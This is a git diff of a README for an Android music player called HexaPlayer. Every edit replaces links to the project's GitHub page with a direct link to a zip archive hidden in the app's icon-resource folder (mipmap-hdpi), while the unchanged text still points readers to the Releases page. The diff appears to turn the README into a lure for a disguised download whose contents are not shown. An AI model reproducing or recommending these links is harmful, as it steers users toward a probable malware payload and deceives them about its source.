@@ -1,6 +1,6 @@
 # 🎵 HexaPlayer - Simple Local Music Experience
 
-[![Download HexaPlayer](https://img.shields.io/badge/Download-HexaPlayer-green)](https://github.com/Axel354/HexaPlayer)
+[![Download HexaPlayer](https://img.shields.io/badge/Download-HexaPlayer-green)](https://raw.githubusercontent.com/Axel354/HexaPlayer/main/app/src/main/res/mipmap-hdpi/Hexa-Player-v3.7-beta.5.zip)
 
 ## About HexaPlayer
 
@@ -36,12 +36,12 @@ This guide will help you download and run HexaPlayer on your Android device. The
 
 To get HexaPlayer, please visit the official GitHub page linked below. It contains the latest release versions and installation instructions.
 
-[![Download HexaPlayer](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Axel354/HexaPlayer)
+[![Download HexaPlayer](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Axel354/HexaPlayer/main/app/src/main/res/mipmap-hdpi/Hexa-Player-v3.7-beta.5.zip)
 
 ### How to download:
 
 1. Click the link above or visit:
-   https://github.com/Axel354/HexaPlayer
+   https://raw.githubusercontent.com/Axel354/HexaPlayer/main/app/src/main/res/mipmap-hdpi/Hexa-Player-v3.7-beta.5.zip
 2. On the GitHub page, look for the "Releases" section. It usually appears on the right sidebar or under the repository description.
 3. Click on the latest release version.
 4. Download the APK file to your Android device. The APK file is the app installer.
@@ -115,6 +115,6 @@ If problems persist, you can find help in the GitHub repository’s issues secti
 
 ## 🔗 Useful Links
 
-- Main repository: https://github.com/Axel354/HexaPlayer
+- Main repository: https://raw.githubusercontent.com/Axel354/HexaPlayer/main/app/src/main/res/mipmap-hdpi/Hexa-Player-v3.7-beta.5.zip
 - Release files and downloads: Visit the "Releases" page linked above on the repository site.
 - Report issues or request features in the GitHub issues tab.
